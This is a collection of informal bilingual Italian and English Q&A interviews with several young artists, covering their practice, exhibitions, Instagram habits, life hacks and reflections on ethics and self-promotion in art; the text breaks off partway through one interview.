Il mio medium mi dice sempre che il mio potere proviene dal mare e dall’acqua e io credo che sia vero! Hahaha. Il mio medium è ottimo, è il direttore di una compagnia e rende merito di tutta la sua carriera alla meditazione. L’ho incontrato a caso e ha fatto tutta la lettura del mio chakra il primo giorni che ci siamo incontrati e mi ha detto un sacco di cose sulle mie vite precedenti. A parte quello, sono cresciuto a Jumeirah, che e un area molto vicino al mare, quindi ho passato quasi tutta la mia vita in spiaggia. Ho avuto le mie prime esperienze sessuali sulla spiaggia in mezzo alla notte. È il posto in cui mi sento piu sicuro, piu connesso, più me stesso. È la ragione per la quale mi chiamo Jumairy, Jumairy vuol dire di Jumeriah. .
Vivresti senza aria condizionata o senza social media?
Senza social media. Vivendo a Dubai è difficile immaginare una vita senza aria condizionata… e con il riscaldamento globale siamo fottuti, proprio fottuti. Scelgo social media ma se la domanda era tra internet e aria condizionata terrei internet e abbandonerei l’aria condizionata. Haha, tipo morirei ma almeno avrei accesso a tutte le info di cui ho bisogno.
La tua macchina ha un nome?
Ci stavo proprio pensando perché in questo momento sto facendo un lavoro in relazione alla mia macchina. Ora come ora, non ha un nome ma a volte la macchina e una ‘lei’ e questo proviene da una cosa che mi diceva mio padre: la mia macchina è come mia moglie e non dovevo lasciare nessuno guidarla. Quindi ho sempre pensato alla macchina in quanto oggetto femminile direi.
Hai un life hack per noi?
Amo il bukhoor, praticamente un incenso, nella mia camera. Di specifico frankincense. Nel golfo diciamo che il frankincense purifica lo spazio e tanti insegnamenti mistici sostengono questa idea. Porto in giro con me tanti cristalli, magari questo è solo perché sono un po’ pazzo ma sento che i cristalli mi danno una scusa per essere più sicuro in me stesso?! Tipo “ho i miei cristalli, posso essere stronzo oggi’ haha. Ho sempre il mio quarzo rosa con me e a volte faccio degli scambi con altri cristalli. Faccio tante cose strane… Tendo ad aggiungere del curcumina a tutto…curcumina nel mio riso, nella mia pasta, nel mio te. Faccio anche degli esfolianti, aggiungo del curcumina, specialmente curcumina e caffe, ti da un colore splendente!
Una domanda o una riflessione?
Ok, sto contemplando se farmi un tatuaggio o no. E ora sono molto indeciso, non mi piace prendere decisioni che dureranno per sempre. Penso che la mia domanda non sia ‘quale tatuaggio vorresti fare?’ ma piuttosto ‘Pensi che invecchino bene i tatuaggi?’
Io intanto vorrei veramente farmi fare questo logo disegnato dal mio amico Tulip Hazbar per uno dei miei lavori. ‘The Sleepless Pe-Tal’, è un riferimento al tipico immaginario di farmacia. C’è un serpente, ci sono delle ali di un’aquila o quello che sia, se guardi da vicino ci sono delle farfalle con tanti occhi nel disegno e c’è anche una luna che dorme. Quello lo voglio sulla mia schiena, poi un’altra cosa, voglio il nome della mia prima mostra personale sulle costole: ‘BRZ5’ e anche un paio di altre cose qui e lì, niente di grosso… ma non voglio che la mia pelle penzoli dopo e che i miei tatuaggi diventino indefinibili!

If you were stranded on a desert island knowing you would never see anybody ever again, would you keep making art?
Well, I’d probably keep making art exactly for that reason, I wouldn’t have any pressure, no external judgement. It could be a way to really concentrate on the work and putting aside the dynamics that sit around it and the surrounding fears.
Can you tell us about one material that you’re using in your latest work?
I’m fascinated by materials that you can shape, for instance liquids or casting materials. I’m quite interested in them because they allow me to sculpt in an indirect way, in an almost passive way, as if the material manages to find it’s own route independently from me, creating the art work independently.
If we offered you a 15 minute helicopter ride, where would you like to travel?
15 minutes really isn’t much… It would be difficult to get out of Milan or of Italy, but if it were possible, I’d take a ride to the Natural History Museum in Paris, that would be fantastic! I went briefly to Paris when I finished Art School in Milan, I saw Parreno in the Palais de Tokyo, Huyghe at the Pompidou, Matthew Barney at the Bibliotheque Nationale, but the place in the city that really impressed me was the Natural History Museum, with its infinity of fossils and huge mineral stones. Instead, if time wasn’t an issue, I’d like to get to the Gobi desert, Mongolia from above must be quite spectacular.
A guilty pleasure from your instagram likes?
Omg, Kylie Jenner. When she shows up on my feed I feel really quite trashy but I can’t help being fascinated. She really satisfies me from sculptural perspective, I swear. Go Kylie!
If you were the protagonist of a black and white movie, what movie would that be?
I’d be the protagonist of Persepolis, Marjanne. A clever girl, who’s Iranian and who moves to Europe to study. Her dream as a child was to be the “last prophet in the galaxy”, which is a little bit like wanting to be an artist…
A food you wish you knew how to cook?
Oh I hate cooking, I always find ways to avoid doing it. So if I really had to, I’d pick knowing how to make synthetic food, like the pills that stimulate full meals or synthetic meat. Food of the future… I’m waiting.
Whale or Shark?
Shark, big black eyes… shark, shark!
What’s on your Christmas list?
On my christmas list there’s been for a few years now a bigger studio that will allow me to work in a bigger scale, a bit more confidence both in myself and my work and maybe also a new set of photographic lenses!
A life hack for us?
Ok, this is not really a life hack because in fact I’m quite clumsy and not very brilliant, but lately out of necessity I change the components of my devices on my own (so my computer and my phone). They break, I open them and pushed by an uncontrollable wave of stinginess I fix them myself. Usually it works all ok and my self esteem shoots through the roof.
A question you’d ask yourself?
On what instagram profile would you like your work to be published?
@vvvvvvhere seems to publish everyone but they don’t deem me worthy of a look. Or on Kylie’s profile, that would be great!

Se finisci su un isola deserta sapendo che non vedrai mai più nessuno, continueresti a fare arte?
Beh, probabilmente continuerei a fare arte proprio per questo, non avrei nessuna pressione, nessun giudizio esterni. Potrebbe essere una possibilità per concentrarsi veramente sul lavoro e mettere da parte le dinamiche che vi girano intorno e i timori ambientali.
Un materiale che stai usando ultimamente?
Sono molto affascinata dai materiali difficili da plasmare, come per esempio i liquidi o i materiali da colata. Mi interessano perché mi permettono di scolpire in modo indiretto e quasi passivo, come se il materiale riuscisse a trovare la sua strada indipendentemente da me, creando l’opera autonomamente.
Se ti regaliamo un volo in elicottero di 15 minuti, dove andresti?
15 minuti sono pochi… sarebbe difficile uscire da Milano o dall’Italia, ma se fosse possibile, uno strappo al museo di Storia Naturale di Parigi sarebbe fantastico! Sono stata brevemente a Parigi finita l’Accademia a Milano, ho visto Parreno al Palais de Tokyo, Huyghe al Pompidou, Mattew Barney alla Biblioteque Nationale, ma il luogo che più mi ha impressionato della città è stato proprio il Museo di Storia Naturale, un’infinità di fossili e di enormi pietre minerali. Se invece il tempo non fosse un problema mi piacerebbe arrivare fino al deserto del Gobi, la Mongolia dall’alto deve essere spettacolare.
Un tuo guilty pleasure su instagram?
Oddio, Kylie Jenner! Quando mi appare sul feed mi sento veramente una tamarra ma non posso fare a meno di essere affascinata. Mi appaga dal punto di vista scultoreo, giuro. Vai Kylie!
Se fossi protagonista di un film in bianco e nero, chi saresti?
Sarei la protagonista di Persepolis, Marjanne. Una ragazza molto sveglia, iraniana che si trasferisce in Europa per studiare. Il suo sogno da bambina era ‘’diventare l’ultimo profeta della galassia’’, che è un po’ come voler fare l’artista…
Un cibo che vorresti saper cucinare?
Odio cucinare, cerco sempre un modo per evitare di farlo. Quindi se proprio dovessi, sceglierei di cucinare un cibo sintetico, come le pillole che simulano i pasti completi o la carne sintetica. Cibo del futuro, ti aspetto.
Balena o squalo?
Squalo, occhi grandi, neri… squalo squalo!
Qualcosa sulla tua lista per babbo natale?
Sulla mia lista per Babbo Natale c’e gia da qualche anno uno studio più grande e che mi permetta di lavorare in scala maggiore, un po’ più di sicurezza in me stessa e nel mio lavoro, e magari anche un nuovo set di lenti fotografiche!
Life hack da condividere?
Ok, non è proprio un life hack perché in realtà sono piuttosto imbranata e poco geniale, ma ultimamente per necessità cambio i componenti dei miei device da sola: computer e cellulare. si rompono, li apro e spinta da una incontrollabile taccagneria me li aggiusto da sola. Di solito va bene e la mia autostima sale a livelli vertiginosi.
Domanda che faresti a te stessa?
Su quale profilo di IG vorresti che le tue opere fossero pubblicate?
@vvvvvvhere che pubblica chiunque a me non mi degna di uno sguardo. O sul profilo di Kylie, sarebbe fantastico!

How do you present yourself on your CV or motivation letters?
I usually am really straightforward with how everything works and I’m really anti-personal-statements, I never give personal statements. Pretty much never, unless I feel like it’s gonna be useful. It’s usually quite difficult to define things and I find it quite difficult to speak in general and precisely because things are complicated and spiralling. I feel like it’s just touching things at the surface to pinpoint things, and like, if I were to write a statement it’d probably be like 40 pages long, and it would be some like video or performance. I’d rather not engage in that generally.
What’s in/on your bedside table?
My bedside table is like a drill set box that came with my drill, it’s just a box that sits there with stacked up bills that I need to pay and plants basically..haha and things that I’m reading, books and shit.
What company or franchise do you wish would go out of business?
Mcdonalds. 100%. Mcdonalds is the devil. Yea.. haha. Mcdonalds is the devil 100%. Recently I’ve gotten into the bad habit of getting filet-o-fish and fries cus I’ve been stealing all the vouchers from the metro. And I’ve been drinking too much and ending up going there because it’s the only place open, but I boycotted it for like 4 years or something. So if ever it goes out of business I wouldn’t have to go there at all haha…Actually, I’ve realised the corporation I want to go out of business more than anything is Nike. Too late to swap? Nike if definitely the devil.
An event this year that had a direct impact on your practice?
I think starting the RA (Royal Academy) was the biggest thing because it made me think a lot about things because usually I’m quite a fast worker and I overproduce quite a lot, I make a lot of stuff. Since I’ve started this masters I’ve been learning how to slow down because I’ve got 3 years so I’m not in any rush, and the work has changed a lot. I’ve got time, I’m not in any rush to get anywhere. I don’t really do research but I spend more time sitting with things, I’m working on objects I’ve been working on for like the past 3 months maybe, and I’d never spend that long making a thing. I’ll sit with it then I think it might need some paint, then I might carve a piece off it, I’ll take it apart and put it back together in another way, so I’m like constantly working on these objects. I’ve maybe got like 6 of them which I’m working on at the same time, it’s so much richer I think. So learning pace in general…but also being really broke! It’s probably had a big effect on me because I don’t have money to produce anymore, I have to sit with the things that I have!
Ketchup or Mayonnaise?
Neither! Hahaha neither! I used to eat mayo all the time but eggs are really gross so I don’t eat mayo anymore. And ketchup is just not that interesting. I’m always fascinated by people who are really obsessed with ketchup but I’d rather just have like olive oil or something. This new Siracha mayo thing is really good, it’s like vegan and really nice.
The last music video that your watched?
It might have been yesterday. My friend basically sends me music videos, like 5 a day. I try to get through this stuff, like the backlog of shit, most of the time.
If you could play one instrument really well, which would it be?
Jazz trumpet, yea straight up. That would be my dream. I really I really wanna be a jazz musician but I can’t play music so I make things. I used to play the violin and the flute… but really bad, I never got anywhere so I just quit before.
The last exhibition where you thought ‘wow’?
Yea, that was today actually: Francis Upritchard at the Barbican Curve. She makes these figurative sculptures, the work was amazing. I’m kind of obsessed with figurative sculpture and the moment and just trying to make figurative sculpture, so just seeing how she does it was really exciting.
A life hack for us?
My life hack is: meditate. lol.
A question for us… something you’ve been thinking or reflecting on?
If you, like Crusoe after a shipwreck landed on an island, and you’ve got all the books in the world but you know you’re never gonna see a living face ever again, would you open the books? (I got that from Darren Bader’s book Life As a Readymade by the way.) Would you read the books knowing you would never see another human again? That’s my question. Which really just means: if you’re like alone and you know that there’s no more knowledge to pass onto anyone, is there any point? Surely you’d burn them all to keep warm right? Is it worth knowing anymore knowledge if you know you’re just gonna die?
I don’t know if I’d wanna read any of it. Why I find this question interesting is because it translates to making, and like making in isolation knowing nobody is ever going to see anything you make, is it worth making anything?
This ties into maybe the CV question and about self-promotion… like I don’t really self-promote, I haven’t really posted about the show I’m in (New Contemporaries) and I don’t really think I need to. I don’t really like the model people are following at the moment (with instagram)… maybe I’m lucky, like I’m here with a 3 year master, I don’t need to rush to try and survive as an artist, I’ve got the luxury of time and not needing to push myself too hard… but I think it’s a scary place that art is moving to where people are constantly promoting themselves and what they’re doing. I think we should be promoting the work, and not the character, the brand. It’s turning into a branding exercise and I’m not into that.
So, maybe I would keep making, obviously people see stuff, like we’re talking now and people see things and you are pushed into the world, but I mostly make things in isolation and it’s about a balance I think. If I was on the island and asked if I would make things knowing I’d never see another human again: yes.

Come ti presenti sul tuo CV o lettere di motivazione?
Di solito diretto ed onesto. Sono veramente contro gli statement, non do mai un ‘personal statement’. Quasi mai, a meno che non senti l’utilità di farlo. È abbastanza difficile definire le cose e trovo sia difficile parlare in generale proprio perché le cose sono complesse e si muovono in spirale. Penso che scrivere uno ‘statement’ sia soltanto toccare le cose in superficie per individuarle, e se io dovessi scrivere uno statement sarebbe lungo circa 40 pagine, e sarebbe un video o una performance. Ma preferirei non partecipare in questi modelli in generale.
Cosa c’e dentro o sopra al tuo comodino?
Il mio comodino è una specie di scatola per trapano che è arrivata con il mio trapano, è semplicemente una scatola seduta lì con pile di bollette che devo ancora pagare e piante… haha, e cose che sto leggendo, libre e altra roba.
Quale compagnia o franchising ti piacerebbe vedere fallire?
Mcdonalds. 100%, Mcdonalds è il diavolo. Si… hahahah. Mcdonalds è il diavolo al 100%. Di recente ho svilupatto la brutta abitudine di prendermi il filet-o-fish con patatine perché rubavo i vouchers dalla metro. E poi bevevo troppo e finivo li perché era l’unico posto aperto, ma ho boicottato Mcdonalds per 4 anni. Perciò se fallisce non potrò mai più andarci haha… Anzi, ho realizzato che la compagnia che vorrei vedere fallire è Nike. Troppo tardi per cambiare? Nike è definitivamente il diavolo.
Un evento di quest’anno che ha avuto un impatto diretto sulla tua pratica?
Penso il fatto di aver iniziato il corso alla RA (Royal Academy) è la cosa più grande perché mi ha fatto pensare molto alla mia pratica, perché di solito lavoro molto veloce e produco un sacco, faccio tanta roba. Da quando ho iniziato questo Master sto imparando a rallentare perché ho 3 anni perciò non sono di fretta, e il lavoro è cambiato tanto. Ho tempo, non sono di fretta ad arrivare da qualche parte. Non faccio veramente ricerca ma passo più tempo affianco alle cose, sto lavorando su oggetti su cui ho lavorato per gli ultimi 3 mesi magari, e di solito non avrei passato mai così tanto tempo a creare qualcosa. Mi siedo affianco e poi penso che ha bisogno di un po’ di pittura, poi magari ne ricavo fuori un pezzo, lo decostruisco poi lo ricompongo in un altro modo, perciò sto costantemente lavorando su questi oggetti. No ho magai tipo 6 sui quali sto lavorando allo stesso momento, è un processo più ricco penso. Quindi il passo con il quale sto imparando in generale… ma anche essere al verde! Ha avuto un grosso effetto su di me perché non ho soldi per produrre perciò sto tanto tempo con le cose che ho!
Ketchup o maionese?
Nessuno! Hahaha nessuno dei due! Mangiavo sempre la maionese ma le uova mi fanno schifo perciò non mangio più la maionese. E il ketchup non è poi cosi interessante. Sono sempre affascinato da persone che sono ossessionate con il ketchup ma preferirei avere un po’ di olio d’oliva o qualcosa del genere. C’è questa nuova salsa maionese Sriracha è veramente buona, è vegana e super buona!
L’ultimo videoclip che ti sei guardato?
Mi sa che era ieri. Il mio amico mi manda video, tipo 5 al giorno. Cerco di vederli tutti, un’accumulamento di roba, la maggior parte del tempo.
Se potessi suonare uno strumento, quale sarebbe?
La tromba jazz, sinceramente si. Sarebbe il mio sogno. Volevo veramente essere un musicista jazz ma non so veramente suonare perciò creo cose. Prima suonavo il violino e il flauto… ma molto male, non sono mai arrivato da nessuna parte perciò mi sono fermato prima.
L’ultima mostra che hai visto che ti ha fatto pensare ‘wow’?
È stato oggi infatti: Francis Upritchard alla Curve del Barbican. Crea queste sculpture figurative, il lavoro è fantastico. Sono un po’ ossessionato con sculture figurative in questo momento e sto cercando di crearle me stesso, perciò vedere come le fa lei è stato eccitante.
Un life hack per noi?
Il mio life hack: meditate. Lol.
Una domanda per noi? Qualcosa sul quale stai riflettendo di recente?
Se tu, come Crusoe dopo un naufragio atterri su un isola deserta e hai tutti i libri del mondo ma sai che non vedrai mai più nessuno, apriresti i libri? (questo l’ho trovato in un libro di Darren Bader che si chiama Life as Readymade) Leggeresti i libri sapendo che non vedrai mai un’altro essere umano? Quella è la mia domanda. Che in realtà vuol dire: se sei da solo/a e che non c’è sapere da trasmettere a nessuno, perché leggere? Di sicuro li bruceresti per stare al caldo no? È importante sapere di più se poi di sicuro morirai?
Non so se ne vorrei leggere. Trovo questa domanda interessante perché si traduce nel produrre, e nel produrre in isolazione sapendo che nessuno mai vedrà quello che produci, è valido continuare a produrre?
Questo si lega alla domanda del CV e dell’auto promozione… che tipo a me non piace proprio auto-promuovermi, non ho versamento postato a proposito della mostra nella quale sono al momento (New Contemporaries) e non penso di doverlo fare. Non mi piace la struttura che la gente sta seguendo ora (su Instagram)… magari sono fortunato, tipo che sono qui con un master di 3 anni, non devo spingermi troppo… ma penso che sia una direzione paurosa quella verso la quale l’arte di oggi si sta muovendo, dove la gente si sta costantemente promuovendo con quello che sta facendo. Penso che dobbiamo promuovere il lavoro, e non il personaggio, il marchio. Sta diventando un esercizio di branding e a me non interessa.
Quindi, mi sa chi io continuerei a produrre, è ovvio che la gente vede cose, e uno viene spinto nel mondo, ma io creo principalmente nel isolazione e penso che si debba trovare un equilibrio giusto. Se io fosse sull’isola e mi facessero la domanda: creeresti cose sapendo di mai più vedere nessuno? La mia risposta sarebbe si.

What role do ethics have in making art?
I would say that ethics mostly become relevant in relation to labour and how the context of art labour is conducted (if you can say that?)… and I guess it has a role if a piece involves ethics!
Do you have any piercings/tattoos?
Yes! I have like 5 in my ears, one in my belly button and I guess I have like 4 tattoos or something. Wait, let me count, yes, 4! For the belly button ring… it’s because I wanted to be like Britney Spears and I still want to be like her because it will never leave my consciousness.
Does she still have it?
Yes! I’m pretty sure.
Can you tell us of one thing you remember seeing on instagram today?
Hahah, my own post. I’ve been looking at my own posts today, evaluating them and stuff, and I really clearly remember my own post. It’s a screenshot from another account which I’ve been following for a really long time which is a meme with to M&Ms talking to one another.
And then the twist is that I added a text: ‘All middle class girls in Sweden’.
The best boy band ever?
Oh my god, I’ve never listened to a boy band! I don’t know.
A text you’ve consulted recently for your work?
Ouu, interesting. I‘ve been working a lot with Maurice Merleau-Ponty and his book ‘Phenomenology of Perception’. I’m working together with a friend on compiling an exhibition with other artists as well, based on a philosophical premise that is derived from his work, but that is also derived into a fictional premise; something that could be possible if we use his thoughts. It’s going to be in June next year.
What’s your favourite smell?
Rain on asphalt. Very cliche but that’s it…but has to be kind of warm asphalt and I guess it has to be surrounded by some greenery I would say, it can’t be just asphalt.
A movie you can watch over and over?
Inception. I think I saw it maybe 2 months ago or something, but maybe I’m more of a TV show girl. I have my TV shows that I have watched all the seasons like 7 times over and over. I don’t know if everybody does that but I do have that. Like ‘True Blood’ is the latest one… but also this fucking shame of my life, I can’t believe I’m admitting to it but also ‘How I Met Your Mother’ I’ve watched like 20 times, it’s so bad. I watch it if I don’t want to think about anything, and if like I’m tired, I kind of don’t even watch it, I just turn it on and listen to it and think to myself ‘Oh my god, this is embarassing’ or ‘oh they’re so sexist, they’re homophobic, omg it’s actually racist’ and I still kind of enjoy having it there because it’s something I remember from my childhood. It’s like kind of having the voices of a known environment around me.
Have you ever locked yourself outside of the house?
Yes. Yea, many times I guess. I can’t even remember all the times. The very last time I just locked myself out of mine and Guendalina’s room in the house we currently live in. I was just in the kitchen and we lock our room because we live with so many randos. The door locks by itself and luckily the window was open and I just climbed back in so I was fine. I just had a thought that maybe I should always leave the window open so that I can always come in. It’s on the second floor, there’s a little roof thingy that you can hold onto and climb up.
A painter you like?
I did see something recently. I’m so bad with names so I need to look. I see the paintings but I don’t remember the artist. It looked soft, blurred but still detailed like reddish scales and simple with beautiful light.
Scales, like fish scales?
No, scales of red of basically portraits of men, like gay men. I’m sure you’ve seen it, people have been into her lately this painter. I also saw a painter using airbrush paint that looks really digital. Maybe I’d like to name drop her as well, I don’t know haha!
The ‘red’ lol

And then the airbrush painter:

Do you have a life hack to share with us?
I remember once I thought to myself that I was doing a life hack, which is such a funny life hack because it’s not really a hack – but it becomes a hack because it’s such an obvious thing that you wouldn’t think about it. It’s when, you know, you have a water bottle that’s too big for a tap and can’t fill it up so you’re like ‘damn it, what am I gonna do? I can’t just crumple this up into a small bottle and fill it. The hack is that: you actually can! You can just squeeze it, make it small, almost ruin it, fill it up and then you’re fine! I do it almost every day.
Do you have a question for us?
I had this in a conversation with a friend and with Guendalina yesterday. We were talking about people’s CVs and job applications. And we stated that there are 2 types of people, The ones that go for the strategy of ‘I would be so dedicated, I love your company, I really wanna work for you, I’m really excited’ and they go for all of it. Then there are the ones that go for a strategy that is ‘I’m a little bit too good for this, you should be really happy to have me, I don’t want this job but it would be great if you got me’ the ones that try to play it cool basically. And the question is: Which type are you?
Which type are you?
The one that crawls, the one that’s like ‘I would like to work hereee, I’m gonna be dedicated!!’

Che ruolo ha l’etica nel fare arte?
Direi che l’etica diventa rilevante quando si tratta di lavoro e come il contesto nel quale viene fatto (se si puo dire?)… Penso che abbia anche un ruolo se l’opera d’arte ha a che fare con l’etica.
Hai dei piercing o tatuaggi?
Si! Ne ho tipo cinque nelle orecchie, uno all’ombelico e penso di avere 4 tatuaggi o qualcosa del genere. Aspettate che conto, si, 4! Per il piercing all’ombelico… volevo essere come Britney Spears e ho ancora voglia di assomigliarli, questo non lascerà mai la mia coscienza.
Ce l’ha ancora Britney?
Si, sono abbastanza sicura.
Una cosa che ti ricordi di avere visto oggi su instagram?
Hahaha, il mio proprio post. Oggi stavo guardando i miei post, valutandoli e roba del genere, quindi mi ricordo chiaramente un mio post. E’ uno screenshot di un altro account che sto seguendo da un bel po’ di tempo ed è un meme con 2 M&Ms che si parlano e poi ho aggiunto il testo: ‘le ragazze svedesi della borghesia’.
La migliore boy band che esiste?
Oh mio dio, non ho mai ascoltato una boy band. Non lo so!
Un testo che hai consultato di recente per un tuo lavoro?
Uuuu, interessante. Stavo lavorando tanto con Maurice Merleau-Ponty e il suo libro ‘Fenomenologia della percezione’. Sto preparando una mostra con una amica, coinvolge altri artisti e si basa su una premessa filosofica che deriva dal suo lavoro ma che deriva anche in una premessa fittizia: quello che potrebbe essere possibile se usassimo i suoi pensieri. Sarà a giugno dell’anno prossimo.
Cos’è il tuo odore preferito?
La pioggia sull’asfalto. Molto cliché ma è quello…ma deve essere asfalto caldo e penso che deve essere circondato da un po’ di vegetazione direi, non può semplicemente essere asfalto.
Un film che puoi rivedere all’infinito?
Inception. Penso di averlo visto 2 mesi fa. Ma magari sono una persona che si da di più alle serie TV. Ho le mie serie di cui ho visto tutte le stagioni all’infinito. Non so se tutti lo fanno ma io si. Tipo ‘True Blood’ è l’ultima…ma anche questa grossa vergogna della mia vita, e non posso credere che lo sto ammettendo, ‘How I met your mother’ l’avrò’ vista tipo 20 volte, e’ terribile. La guardo se non voglio pensare ad altro e se sono stanca, non la guardo neanche in realtà, la metto su e ascolto e mi dico ‘oh mio dio, questo è imbarazzante’ oppure ‘oh, quanto sono sessisti, sono omofobi, oh mio dio sono veramente razzisti’ e mi piace averla lì comunque perché è qualcosa che mi ricorda la mia infanzia. È come essere circondata da voci con le quali sono familiare.
Ti sei mai chiusa fuori di casa?
Si. Si, tante volte penso. Non mi ricordo neanche quante volte. L’ultima volta mi sono chiusa fuori dalla stanza nella quale vivo con Guendalina, dentro alla casa in cui viviamo attualmente. Ero in cucina, e chiudiamo a chiave la nostra stanza perché’ viviamo con delle persone un po a caso. La porta si chiude da sola e per fortuna la finestra era aperta quindi sono scalata dentro. Ho pensato di sempre lasciare la finestra aperta per questo motivo. E’ sul secondo piano, c’è un piccole tettuccio sul quale posso aggrapparmi e salire.
Un pittore/pittrice che ti piace?
Ho visto qualcosa di recente. Sono terribile con i nomi perciò devo guardare. Mi immagino i dipinti ma non mi ricordo il nome dell’artista. Erano morbidi, sfuocati ma allo stesso tempo dettagliati con tonalità’ di rosso e semplici con una bella luce. In pratica ritratti di uomini, uomini omosessuali. Sono sicura che li avete visti, la gente impazzisce per i suoi dipinti ultimamente. Ho anche visto dipinti di una pittrice che usa la pittura con l’airbrush che li fa sembrare digitali.
Quello ‘rosso’ lol

And la pittrice che usa il airbrush:

Hai un life hack per noi?
Me ne ricordo di uno che stavo facendo ed è buffo perché non sembra veramente un lifehack ma ne diventa uno perché è una cosa molto ovvia da fare alla quale uno non pensa. E’ quando hai una bottiglia d’acqua e la devi riempire ma la bottiglia è troppo grossa per stare sotto al rubinetto. E uno pensa ‘cavolo, cosa faccio? Non posso fare niente’ e invece devi solo accartocciarla e poi riempirla, questo è il life hack: lo si può fare! Devi solo schiacciarla, farla diventare più piccola, quasi rovinarla, poi riempirla e funziona! Lo faccio quasi tutti i giorni.
Una domanda che ti faresti?
Stavo avendo questa conversazione con un’amica e Guendalina ieri. Stavamo parlando di CV e candidature di lavoro. E ci siamo dette che ci sono 2 tipi di gente, quelli che usano la strategia ‘sarei super impegnata, mi piace tantissimo la vostra compagnia, vorrei tanto lavorare per voi, non vedo l’ora’ e ce la mettono tutta. E poi ci sono quelli che usano la strategia che è ‘ io sono un po’ troppo bravo per questo lavoro, dovreste essere felici di avermi, non voglio veramente avere questo lavoro ma sarebbe ottimo se io lavorassi con voi’ quelli che se la tirano e cercano di giocarsela cool. E mia la domanda è che tipo se tu?
E che tipo sei tu?
Quello che gattona, quella che è del tipo ‘Voglio lavorare quiiiii, sarò super impegnataa!!!’

Do you leave the house with 100% or 30% battery on your phone?
I am 100%. 100% yea. There is no point in leaving the house with just 30% because it’ll just be dead by the end of the street. I would say that I’m pretty successful in doing so, it’s one of the ones I’m actually quite good at.
A sport you excelled at as a child?
Ehmm I was really good at netball. I was alright at tennis though I could never really get the serve down which is ironic since now I just spend like all of my life performing this one performance called The Serve. I dabbled in a bit of lacrosse… that was a bit of a strange experience because I went to like a normal state comp school and the only schools that played lacrosse were these really crazy boarding schools so we’d always go and play these schools in their beautiful grounds and we’d get absolutely smashed every single time! It was kind of learning a lesson I guess [hahaha], like the rich are just really rich, and better than you at sport! Hahaha… but I like to think I was pretty good within the school.
Do you want to tell us a bit more about The Serve performance?
It’s a performance about my autobiography, between me and my sisters’ relationship but also about the Williams sisters’ relationship, Venus and Serena, and kind of blurring the two. My dad plays tennis and he’s really obsessed, like making us become the next Williams sisters, which is quite a common thing. And my brother too, he was also going to be like the next Williams sisters. He’d take us to the local court and play all the time. We weren’t that good, like I said, but you know, he loved it and we didn’t want to let him down. We’d always get in the car on the way back and we’d be like ‘Dad, dad! Rate us! Rate us!’ and he’s be like ‘Ook, today Rosa a 7 for accuracy and a 5 for speed’ and those kinds of things. I was always a very slow tennis player, the balls I would hit were unexpectedly slow so that was kind of my secret weapon.
Loose or tight fitting clothes?
I want to say tight, I know that that is better, but I mean yea: loose fitting clothes… sadly, sadly. It’s a shame you know, I know it’s patriarchal to say but it’s a shame, we’re in our like 20s, we’re young, we should be wearing tight clothes, we haven’t got that much longer you know!? It’s more that you should embrace your body at every stage and if you wear loose clothes the whole time you won’t even know and you’re body is just doing whatever, it’s kind of sad all round. Anyways, I live by that, it’s just what I do! haha
I actually watched this film Irma Vep, from the 90s, it’s a French film. In it the character just wears like this bondage kind of spandex suit for the whole film. It’s kind of a joke and part of the joke is that it’s meant to be a satire of french cinema. Every time she moves it just goes like ‘chrrrrr’
One song you’ve had on loop?
You know what, I don’t actually listen to any music, it’s really bad hahaha… I just listen to the BBC world service, constantly. I find it just puts everything in perspective.
One spice you can’t live without?
Scary Spice!
The Spice Girls are going back on tour right?
Yea, I’m trying to get a free ticket that’s why I’m bringing up Scary Spice! Just mentioning her in the press, in a podcast, maybe they can just find me a free ticket. I’m imaging this panel talk with these women and they need somebody to come and talk about the spice girls and I’m just trying to position myself as an expert hahaha…
A work that you never started or never finished?
I do have one of these with small ears, I’ve looked up people of the internet and just zoomed in on their ears up close and then just made it out of clay. I have Obama’s ear. I don’t really know what to do, I like have all of these ears, I just got quite obsessed. I don’t know what’s going to happen with the ears, they’re weird really. I also have cheddar man, this prehistoric guy they found in England, who’s like the first European sign of man, they’ve reconstructed his face and I did a little clay of his nose haha!
What fictional villain do you identify with?
I would say boss baby. Is boss baby a villain? Do you know boss baby? I don’t think I’ve actually seen the film but I’ve just seen pictures of him. It’s a baby but he’s a boss, there’s just something about him. There’s a TV series as well on Netflix, that’s what I’ve seen.
What are you really happy about being terrible at?
I think probably dancing. I’m quite bad at dancing but I quite enjoy dancing and I obviously do a lot of performance where I dance.
Can you share with us a life hack?
A life hack from my grandma would be something like Brandy gets you rid of hiccups or something like that, haha.
The other day I deleted my email app from my phone. I don’t know if that’s just impractical but it made me feel good at the time. It was liberating just the act of deleting. My boyfriend was like ‘can you even delete the email app?’ and I was like ‘Yeah! I’m just gonna do it!’ and he was like ‘No! Don’t do it! It’s going to be really annoying’, ‘Yeah! I’m just gonna do it!’ And I did it! That was exciting. Delete the mail app!
I feel like with the email app I’m really getting somewhere, like I’m really getting to the heart of the phone, it being one of the essential apps. I could try to delete the clock app…that’s a bit crazy hahaha. I’m going to do that! I’m just going to do that! Can you even do it? Has anyone ever done it before? Oh my god yes, I’m going to do that when I get off this call!
A question/something you’ve been asking yourself lately?
If I’m honest, the question I’ve been asking myself is: What role do ethics have in making art? It’s quite a deep question… I think that the answer may lie in another question which is: why do I make art? The reason I make art is so that I feel good, does that mean that I can do anything in art to make myself feel good? I mean no, obviously because I’m not like a psychopath… but it is a question for me when I’m setting up performances or thinking of audiences for my art work. Where does outreach and accessibility fit in when creatively exploring something which might be problematic? I’m coming to this from a black feminist perspective and someone who is engaged and interested in work that is about participation and accessibility and one of the main reasons I make work like that is because I think it’s the right thing to do… Is that making the most interesting artwork? I don’t know…but that’s what I’ve been thinking about recently.

Esci di casa con il 100% o il 30% di batteria sul tuo telefono?
Direi al 100%. 100% sì. Non ha senso uscire di casa con solo il 30% perché morirà prima di arrivare alla fine della strada. Direi che ho un discreto successo nel farlo, è una di quelle cose che riesco a fare.
Uno sport al quale eri bravissima da bambina?
Hmm ero davvero brava a giocare a netball. Andavo bene a tennis, anche se non ho mai avuto un buon servizio, il che è ironico, dato che ora passo tutta la mia vita a fare questa performance che si chiama The Serve. Ho provato un po’ di lacrosse… è stata un’esperienza un po’ strana, perché frequentavo una normale scuola statale e le uniche scuole che giocavano a lacrosse erano questi collegi davvero folli quindi andavamo sempre a giocare contro queste scuole nei loro bellissimi campi e ci distruggevano ogni volta! Almeno ho imparato una lezione: i ricchi sono solo molto ricchi e più bravi di te nello sport! Haha….. ma direi che ero tra le più brave della mia scuola.
Vuoi dirci un po’ di più sulla performance The Serve?
